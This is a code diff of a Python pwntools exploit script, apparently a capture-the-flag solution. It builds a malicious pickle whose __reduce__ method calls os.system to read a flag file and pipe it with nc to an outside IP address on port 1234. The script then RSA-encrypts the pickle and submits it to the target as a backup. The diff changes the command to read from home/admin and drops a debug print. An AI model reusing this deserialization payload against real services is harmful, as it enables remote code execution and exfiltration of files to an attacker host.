@@ -7,7 +7,7 @@ from pwn import *
 
 class Exploit(object):
     def __reduce__(self):
-        comm = "(cat flag) | (nc 140.114.195.92 1234)"
+        comm = "(cd home/admin;cat flag) | (nc 140.114.195.92 1234)"
         return (os.system, (comm,))
 
 
@@ -21,7 +21,6 @@ def main():
     if key != []:
         key = key[0].split(',')
         fake = rsa.encrypt(pickle.dumps(Exploit()), rsa.PublicKey(int(key[0]), int(key[1]))).encode('base64').replace('\n', '')
-        print fake
         print s.recvuntil('6) Show the key\n')
         s.send('5\n')
         print s.recvuntil('Paste your backup here: ')
